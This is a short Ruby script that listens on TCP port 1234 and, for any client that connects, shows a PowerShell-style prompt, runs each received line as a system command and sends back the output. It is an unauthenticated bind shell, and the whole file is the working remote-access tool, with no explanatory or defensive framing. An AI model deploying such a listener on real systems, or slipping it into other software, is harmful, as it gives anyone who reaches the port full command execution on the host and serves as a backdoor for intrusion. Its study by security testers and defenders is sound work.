require 'socket'
require 'open3'

port = 1234
server = TCPServer.new port

loop do
  client = server.accept
  loop do
    begin
      prefix = 'PS ' + `pwd`.strip + '> '
      client.print prefix
      cmd = client.gets
      break if cmd == nil
      stdout, stderr, status = Open3.capture3(cmd)
      client.puts stdout
    rescue => e
      client.puts("Ruby Error : " + e.to_s)
    end
  end
  client.close
end
